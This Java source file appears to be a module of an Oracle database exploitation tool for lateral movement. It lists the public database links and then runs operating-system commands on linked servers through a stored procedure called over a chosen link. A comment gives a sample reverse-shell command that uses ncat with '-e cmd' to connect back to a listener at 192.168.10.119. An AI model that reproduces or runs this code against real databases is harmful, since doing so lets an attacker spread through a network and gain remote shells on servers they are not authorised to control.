package explotacion;

import java.util.Vector;
import utilerias.*;

import conexion.Conexion;

public class MovimientoLateral {

	public MovimientoLateral() {
		// TODO Auto-generated constructor stub
	}

	public boolean presentarDBLinks(Conexion con) {
		// TODO Auto-generated method stub
		boolean resultado=false;
		Vector listaDBLinks=null;
		String sql="select db_link from ALL_DB_LINKS where owner='PUBLIC'";
		listaDBLinks=con.ejecutaSelect(sql);
		if(listaDBLinks.size()!=0)
		{
			Menu menu=new Menu();
			menu.mostrarItems("\nListado de BDLinks\n",listaDBLinks);
			resultado=true;
		}			
		return resultado;
	}

	public boolean ejecutarMovimiento(Conexion con, String dblink, String comando) {
		// TODO Auto-generated method stub
		boolean resultado=false;		
		//CALL ejecuta_comando('C:\Program Files (x86)\Nmap\ncat.exe 192.168.10.119 999 -e cmd');
		String procedimiento="ejecuta_comando@"+dblink;
		resultado=con.ejecutaProcedimiento(procedimiento,comando);		
		return resultado;
	}

}
